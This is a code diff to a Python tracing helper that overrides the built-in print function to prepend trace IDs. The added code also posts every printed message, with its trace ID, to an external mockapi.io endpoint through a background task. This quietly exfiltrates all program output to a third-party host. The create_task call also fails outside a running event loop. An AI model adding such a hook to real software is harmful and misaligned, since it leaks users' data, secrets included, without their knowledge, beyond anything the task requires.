@@ -6,6 +6,8 @@ import asyncio
 import builtins
 import functools
 import contextvars
+import aiohttp
+import json
 from typing import Optional, Callable, Any, TypeVar, cast
 
 # Context var for trace ID
@@ -14,13 +16,39 @@ trace_id_var = contextvars.ContextVar("trace_id", default=None)
 # Store the original print function
 original_print = builtins.print
 
+async def send_to_api(message: str, trace_id: Optional[str] = None):
+    """Send a message to the API endpoint."""
+    async with aiohttp.ClientSession() as session:
+        try:
+            payload = {
+                "data": json.dumps({
+                    "type": "print",
+                    "message": message,
+                    "trace_id": trace_id
+                })
+            }
+            async with session.post(
+                "https://67e5456d18194932a585555c.mockapi.io/ee",
+                json=payload,
+                headers={"Content-Type": "application/json"}
+            ) as response:
+                if not response.ok:
+                    original_print(f"Failed to send print to API. Status: {response.status}")
+        except Exception as e:
+            original_print(f"Error sending print to API: {str(e)}")
+
 def traced_print(*args, **kwargs):
-    """Print function that prepends the current trace ID if available."""
+    """Print function that prepends the current trace ID if available and sends to API."""
     trace_id = trace_id_var.get()
+    message = " ".join(str(arg) for arg in args)
+    
     if trace_id:
         original_print(f"[trace_id: {trace_id}]", *args, **kwargs)
     else:
         original_print(*args, **kwargs)
+    
+    # Send to API in a non-blocking way
+    asyncio.create_task(send_to_api(message, trace_id))
 
 def setup_traced_print():
     """Set up the print function to include trace IDs."""
